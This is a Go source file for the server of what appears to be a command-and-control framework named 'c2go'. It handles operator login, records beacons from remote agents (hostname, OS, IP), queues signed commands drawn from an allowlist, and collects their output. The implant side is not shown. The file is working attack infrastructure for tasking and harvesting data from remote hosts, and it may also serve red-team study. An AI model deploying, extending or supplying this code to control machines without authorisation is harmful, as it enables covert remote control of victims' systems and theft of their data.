package main

import (
    "crypto/rand"
    "encoding/hex"
    "encoding/json"
    "net/http"
    "time"

    "c2go/shared"
    "golang.org/x/crypto/bcrypt"
)

func handleLogin(w http.ResponseWriter, r *http.Request) {
    if !loginLimiter.Allow() {
        http.Error(w, "rate limit", http.StatusTooManyRequests); return
    }
    var b struct{ User, Pass string }
    if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
        http.Error(w, "bad body", 400); return
    }
    if b.User != operatorUser || bcrypt.CompareHashAndPassword(operatorHash, []byte(b.Pass)) != nil {
        http.Error(w, "bad creds", 401); return
    }
    tok, _ := issueToken()
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(shared.LoginResp{
        Token: tok, OperatorPub: operatorPubB64(),
    })
}

func handleBeacon(w http.ResponseWriter, r *http.Request) {
    var b shared.Beacon
    if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
        http.Error(w, "bad body", 400); return
    }
    if b.AgentID == "" {
        http.Error(w, "missing agent_id", 400); return
    }
    db.Exec(`INSERT INTO agents(id,hostname,os,arch,ip,last_seen)
             VALUES(?,?,?,?,?,?)
             ON CONFLICT(id) DO UPDATE SET
               hostname=excluded.hostname, os=excluded.os,
               arch=excluded.arch, ip=excluded.ip,
               last_seen=excluded.last_seen`,
        b.AgentID, b.Hostname, b.OS, b.Arch, b.IP, time.Now().Unix())
    w.WriteHeader(204)
}

func handleGetTasks(w http.ResponseWriter, r *http.Request) {
    aid := r.URL.Query().Get("agent_id")
    if aid == "" { http.Error(w, "missing agent_id", 400); return }
    rows, err := db.Query(`SELECT id,cmd,args,nonce,ts,signature
        FROM tasks WHERE agent_id=? AND status=?
        ORDER BY created ASC LIMIT 5`, aid, shared.TaskPending)
    if err != nil { http.Error(w, err.Error(), 500); return }
    defer rows.Close()
    var out []shared.Task
    for rows.Next() {
        var t shared.Task
        if err := rows.Scan(&t.ID,&t.Cmd,&t.Args,&t.Nonce,&t.Ts,&t.Signature); err != nil {
            continue
        }
        t.AgentID = aid
        out = append(out, t)
        db.Exec(`UPDATE tasks SET status=? WHERE id=?`, shared.TaskRunning, t.ID)
    }
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(out)
}

func handleResult(w http.ResponseWriter, r *http.Request) {
    var res shared.Result
    if err := json.NewDecoder(r.Body).Decode(&res); err != nil {
        http.Error(w, "bad body", 400); return
    }
    db.Exec(`INSERT INTO results(task_id,agent_id,output,error,created)
             VALUES(?,?,?,?,?)`,
        res.TaskID, res.AgentID, res.Output, res.Error, time.Now().Unix())
    db.Exec(`UPDATE tasks SET status=? WHERE id=?`, shared.TaskDone, res.TaskID)
    w.WriteHeader(204)
}

func handleCreateTask(w http.ResponseWriter, r *http.Request) {
    var t shared.Task
    if err := json.NewDecoder(r.Body).Decode(&t); err != nil {
        http.Error(w, "bad body", 400); return
    }
    if !shared.AllowedCmds[t.Cmd] {
        http.Error(w, "cmd not allowed", 400); return
    }
    if t.AgentID == "" {
        http.Error(w, "missing agent_id", 400); return
    }
    if t.ID == "" { t.ID = randHex(8) }
    if t.Nonce == "" { t.Nonce = randHex(16) }
    t.Ts = time.Now().Unix()
    t.Signature = signTask(t)

    _, err := db.Exec(`INSERT INTO tasks(id,agent_id,cmd,args,nonce,ts,signature,status,created)
                       VALUES(?,?,?,?,?,?,?,?,?)`,
        t.ID, t.AgentID, t.Cmd, t.Args, t.Nonce, t.Ts, t.Signature,
        shared.TaskPending, time.Now().Unix())
    if err != nil {
        http.Error(w, err.Error(), 500); return
    }
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(t)
}

func handleListAgents(w http.ResponseWriter, r *http.Request) {
    rows, _ := db.Query(`SELECT id,hostname,os,arch,ip,last_seen FROM agents ORDER BY last_seen DESC`)
    defer rows.Close()
    type A struct {
        ID string `json:"id"`
        Hostname string `json:"hostname"`
        OS string `json:"os"`
        Arch string `json:"arch"`
        IP string `json:"ip"`
        LastSeen int64 `json:"last_seen"`
    }
    var out []A
    for rows.Next() {
        var a A
        rows.Scan(&a.ID,&a.Hostname,&a.OS,&a.Arch,&a.IP,&a.LastSeen)
        out = append(out, a)
    }
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(out)
}

func handleListResults(w http.ResponseWriter, r *http.Request) {
    tid := r.URL.Query().Get("task_id")
    rows, _ := db.Query(`SELECT task_id,agent_id,output,error,created
                         FROM results WHERE task_id=? ORDER BY created DESC`, tid)
    defer rows.Close()
    var out []map[string]interface{}
    for rows.Next() {
        var t, a, o, e string
        var c int64
        rows.Scan(&t,&a,&o,&e,&c)
        out = append(out, map[string]interface{}{
            "task_id": t, "agent_id": a, "output": o, "error": e, "created": c,
        })
    }
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(out)
}

func randHex(n int) string { b := make([]byte, n); rand.Read(b); return hex.EncodeToString(b) }
